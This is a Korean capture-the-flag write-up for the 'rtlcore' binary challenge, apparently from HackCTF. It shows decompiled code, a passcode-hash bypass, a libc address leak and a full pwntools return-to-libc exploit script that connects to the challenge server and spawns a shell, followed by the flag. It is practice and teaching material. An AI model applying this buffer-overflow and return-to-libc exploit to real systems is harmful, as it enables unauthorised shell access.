@@ -1,0 +1,181 @@
+제일먼저 어느기법으로 쉘의 권한을 획득할것인지 정하기 위해
+
+checksec 를 입력해 보호기법이 무엇이걸려있는지 확인한다.
+
+보호기법을 보면 NX 만 걸려있으므로
+
+쉘코드만 사용이 불가능 하다.
+
+이제  IDA 를 통해서 코드를 확인해보자.
+
+
+main.c 
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [esp+Ch] [ebp-1Ch]
+
+  setvbuf(_bss_start, 0, 2, 0);
+  puts(&::s);
+  printf("Passcode: ");
+  gets(&s);
+  if ( check_passcode(&s) == hashcode )
+  {
+    puts(&byte_8048840);
+    core();
+  }
+  else
+  {
+    puts(&byte_8048881);
+  }
+  return 0;
+}
+
+if 문을보면 check_passcode(&s) == hashcode 인데 hashcode 가 func를 보면
+
+data:0804A030 hashcode        dd 0C0D9B0A7h           ; DATA XREF: main+65↑r
+
+있다 따라서 해쉬 코드가 0x0C0D9B0A7 라는것을 알수있다.
+
+따라서 우리가 계산할 check_passcode 함수에서 해쉬코드와 같아야한다.
+
+
+@@@@@@@@@@
+
+check_passcode.c
+
+int __cdecl check_passcode(int a1)
+{
+  int v2; // [esp+8h] [ebp-8h]
+  signed int i; // [esp+Ch] [ebp-4h]
+
+  v2 = 0;
+  for ( i = 0; i <= 4; ++i )
+    v2 += *(_DWORD *)(4 * i + a1);
+  return v2;
+}
+
+
+반복문을보면 5번 반복하므로 해쉬함수의 나누기 5를 해서 입력해주면된다.
+
+0x0C0D9B0A7를 5로 나누면 \x21\xf0\x91\x26 된다. 하지만 5로 전부 나누어 지지않고 2가 남기때문에
+
+마지막 코드에 2를 더해준다. 즉 \x23\xf0\x91\x26 이된다.
+
+페이로드를 작성할때.
+
+\x21\xf0\x91\x26 * 4 + \x23\xf0\x91\x26 해주면 된다.
+
+이렇게 입력하게되면
+
+코드가 일치한다며 나에게 필요한 주소를 주게된다.
+
+그 주소를 조사해보자.
+
+현재 나에게 0xf7df63a0 이라는 주소를 받았다. 일단 이주소의 출처를 알아보자.
+
+일단
+
+core.c
+
+ssize_t core()
+{
+  int buf; // [esp+Ah] [ebp-3Eh]
+  int v2; // [esp+Eh] [ebp-3Ah]
+  __int16 v3; // [esp+12h] [ebp-36h]
+  int v4; // [esp+38h] [ebp-10h]
+  void *v5; // [esp+3Ch] [ebp-Ch]
+
+  buf = 0;
+  v2 = 0;
+  v4 = 0;
+  memset(
+    (void *)((unsigned int)&v3 & 0xFFFFFFFC),
+    0,
+    4 * (((unsigned int)((char *)&v2 - ((unsigned int)&v3 & 0xFFFFFFFC) + 46) & 0xFFFFFFFC) >> 2));
+  v5 = dlsym((void *)0xFFFFFFFF, "printf");
+  printf(&format, v5);
+  return read(0, &buf, 0x64u);
+}
+
+를보면 dlsym 함수를 통해서 printf 를 보여주고있다. 따라서 우리가본 주소는 printf 의 주소이다.
+
+그리고 read 함수를 통해 입력받으므로 우리는 read 함수와 printf 의 주소를 가지고 풀어야한다.
+
+따라서 우리가 항상 풀어왔던것처럼 페이로드를 작성한다.
+
+일단 가볍게 첫단계를 넘어가기위한 해시코드를 페이로드에 작성하고.
+
+우리가 읽은 0xf7df63a0 코드를 recv 로 읽은다음에
+
+시스템 주소는 우리가 읽은 주소에서 printf 주소를 빼준것이 libc 베이스주소이다.
+
+이제 시스템 주소와 bin/sh 주소를 구하려면
+
+libc 베이스 주소에다가 시스템 오프셋 주소를 더하면 시스템 주소이고
+
+똑같이 bin/sh 오프셋 주소를 더하면 bin/sh 주소이다.
+
+다만 bin/sh는 찾아야하므로 search 함수를 사용한다.	( 오프셋 구하려면 symbols 를 사용한다 )
+
+그리고 이 구한것들을 read 함수 취약점에 대입해야 하므로 read 함수 까지의 버퍼를 구한다.
+
+buf 의 버퍼는 0x3E 이므로 이것을 10진수로 바꾸면 62 이다 그리고 이 파일은 32비트 파일이므로
+
+SFP 4바이트를 더하면 총 66바이트
+
+총 버퍼는 66바이트가 된다.
+
+페이로드는
+
+66 + return address 를 해주면 된다. 이제 페이로드를 작성해보자. 
+( 66 byte + system + 4byte + bin/sh )
+
+
+pay.py
+
+from pwn import *
+
+p = remote('ctf.j0n9hyun.xyz',3015)
+e = ELF('./rtlcore')
+libc = ELF('./libc.so.6')
+
+
+
+payload = "\x21\xf0\x91\x26" * 4
+payload += "\x23\xf0\x91\x26"
+
+p.recvuntil("Passcode: ")
+p.sendline(payload)
+
+
+p.recvuntil('0x')
+print_add = int(p.recv(8),16)
+
+libc_basc = print_add - libc.symbols['printf']
+system_add = libc_basc + libc.symbols['system']
+binsh_add = libc_basc + libc.search('/bin/sh').next()
+
+payload = "A" * 66
+payload += p32(system_add)
+payload += "A" * 4
+payload += p32(binsh_add)
+
+p.sendline(payload)
+
+p.interactive()
+
+
+이다.
+
+플래그는 HackCTF{5ucc355ful_r7lc0r3_f1l3_4cc355}
+
+## 주의사항
+
+1. ELF() 를 입력할떄 항상 ' ' 이어야한다.
+2. recv 의 () 는 자릿수를 나타내고 뒤의 , 16의 경우는 몇진수 즉 16진수를 나타낸다.
+3. symbols 는 오프셋 값을 구하는 함수이고 [ ] 로 구한다.
+4. /bin/sh 값의 경우는 search 함수로 찾아야하며 search함수 사용시 ('/bin/sh').next() 형태로 찾아야한다.
+
+공부 출처 : https://duwjdtn11.tistory.com/451
+( 도움 많이 되었습니다.!! )
